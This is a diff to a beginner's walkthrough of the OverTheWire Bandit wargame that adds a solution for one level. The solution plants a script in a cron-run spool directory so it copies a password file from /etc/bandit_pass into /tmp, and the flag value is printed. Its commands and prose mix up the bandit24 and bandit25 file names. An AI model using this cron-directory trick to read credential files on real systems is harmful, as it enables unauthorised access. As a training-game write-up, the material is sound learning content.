@@ -27,6 +27,8 @@ OverTheWire Bandit is a linux based Capture the Flag wargame designed for beginn
 - [Level 21 → Level 22](#level-21---level-22)
 - [Level 22 → Level 23](#level-22---level-23)
 - [Level 23 → Level 24](#level-23---level-24)
+- [Level 24 → Level 25](#level-24---level-25)
+- [Level 25 → Level 26](#level-25---level-26)
 
 # Level 0
 
@@ -1508,21 +1510,98 @@ done
 
 We can see in the script that every 60 seconds it is executing all scripts in /var/spool/$myname/foo and then deleting them. 
 
-Let's try to just print the output of /etc/bandit_pass/bandit24
+Let's try to just print the output of /etc/bandit_pass/bandit24]
 
-cat bandit24
+```bash
+cat /etc/bandit_pass/bandit25
+```
 
-output
+```bash
+Output:
+cat: /etc/bandit_pass/bandit24: Permission denied
+
+```
 
 yeah.. that would be too easy, but we have another way! using /var/spool/myname/foo and placing a script in there to read the password for us..
 
+Lets start by creating a directory in /tmp we can work from
 
-![bandit0-2.PNG](https://github.com/EoinReid/Bandit-OverTheWire/blob/main/bandit-screenshots/bandit0-2.png)
+
+```bash
+mkdir /tmp/shell-temp
+```
+
+Then we need to create our shellscript file
+
+```bash
+touch shellscript.sh
+```
+
+Then we need to change the permissions so everyone has read,write and executable permissions
+
+
+```bash
+chmod 777 shellscript.sh
+```
+
+And let write to our script using nano
+
+
+```bash
+nano shellscript.sh
+```
+
+What we are going to do is attempt to exploit how scripts are ran in /var/spool/$myname/foo by trying to output the bandit24 password and writing it to a file in our tmp directory
+
+add the following line to your shell script
+
+
+```bash
+#! /bin/bash
+cat /etc/bandit_pass/bandit25 > /tmp/shell-temp/password
+```
+
+save and exit.
+
+Now we need to create the password file that this script is going to write to
+
+
+```bash
+touch password
+```
+
+And lets update the file permissions so that anyone can read and write to the file
+
+
+```bash
+chmod 666 password
+```
+
+now we just need to copy of shell script into /var/spool/bandit24/foo and wait 60 seconds for it to run
+
+
+```bash
+cp shellscript.sh /var/spool/bandit24/foo
+```
+
+we can use the ls command to check the timestamp of the files in our directory and wait for password to be modified once it has been use cat to read the contents
+
+
+```bash
+ls -la
+```
+
+```bash
+cat password
+```
+
+And we have our flag!
+
 
 ### Flag
 
 ```
-QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
+VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
 
 ```
 
